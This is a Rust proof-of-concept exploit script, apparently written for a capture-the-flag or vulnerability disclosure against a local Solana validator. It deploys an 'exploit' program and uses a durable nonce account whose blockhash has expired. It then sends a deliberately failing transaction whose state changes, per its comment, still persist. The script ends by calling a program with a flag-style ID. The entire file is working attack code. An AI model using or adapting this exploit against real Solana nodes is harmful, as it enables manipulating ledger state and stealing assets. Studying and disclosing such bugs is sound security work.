use std::{str::FromStr, time::Duration};

use poc_framework::{
    clone_keypair, keypair, localhost_client,
    solana_client::{nonce_utils, rpc_config::RpcSendTransactionConfig},
    solana_sdk::{
        commitment_config::CommitmentConfig,
        instruction::{AccountMeta, Instruction},
        nonce,
        pubkey::Pubkey,
        signature::read_keypair_file,
        signer::Signer,
        system_instruction,
        transaction::Transaction,
    },
    Environment, PrintableTransaction, RemoteEnvironment,
};

fn main() {
    let payer = read_keypair_file("rich-boi.json").unwrap();
    let mint = keypair(1);
    let fake_account = keypair(2);
    let nonce_account = keypair(3);

    let client = localhost_client();

    let mut env = RemoteEnvironment::new(localhost_client(), clone_keypair(&payer));

    let program = env.deploy_program("program/target/deploy/exploit.so");

    if env.get_account(nonce_account.pubkey()).is_none() {
        // create nonce account if it doesn't exist
        env.execute_as_transaction(
            &system_instruction::create_nonce_account(
                &payer.pubkey(),
                &nonce_account.pubkey(),
                &payer.pubkey(),
                env.get_rent_excemption(nonce::State::size()),
            ),
            &[&nonce_account],
        );
    } else {
        // advance nonce
        env.execute_as_transaction(
            &[system_instruction::advance_nonce_account(
                &nonce_account.pubkey(),
                &payer.pubkey(),
            )],
            &[],
        );
    }
    let nonce_state =
        nonce_utils::data_from_account(&env.get_account(nonce_account.pubkey()).unwrap()).unwrap();

    // wait three minutes so that the original blockhash is invalid
    const N: usize = 18;
    for i in 0..N {
        println!("waiting {} of {}", i + 1, N);
        std::thread::sleep(Duration::from_secs(10));
    }

    // mint tokens to fake account
    env.create_token_mint(&mint, payer.pubkey(), None, 0);
    env.create_token_account(&fake_account, mint.pubkey());
    env.mint_tokens(mint.pubkey(), &payer, fake_account.pubkey(), 1337);

    // this transaction will fail, but the changes are still written to disk
    let instructions = vec![
        system_instruction::advance_nonce_account(&nonce_account.pubkey(), &payer.pubkey()),
        Instruction {
            program_id: program,
            accounts: vec![AccountMeta::new(fake_account.pubkey(), false)],
            data: vec![],
        },
    ];
    client
        .send_and_confirm_transaction_with_spinner_and_config(
            &Transaction::new_signed_with_payer(
                &instructions,
                Some(&payer.pubkey()),
                &[&payer],
                nonce_state.blockhash,
            ),
            CommitmentConfig::confirmed(),
            RpcSendTransactionConfig {
                skip_preflight: true,
                preflight_commitment: None,
                encoding: None,
            },
        )
        .expect_err("tx did not fail");

    env.execute_as_transaction(
        &[Instruction {
            program_id: Pubkey::from_str("F1ag111111111111111111111111111111111111111").unwrap(),
            accounts: vec![
                AccountMeta::new(fake_account.pubkey(), false),
                AccountMeta::new(fake_account.pubkey(), true),
            ],
            data: vec![],
        }],
        &[&fake_account],
    )
    .print();
}
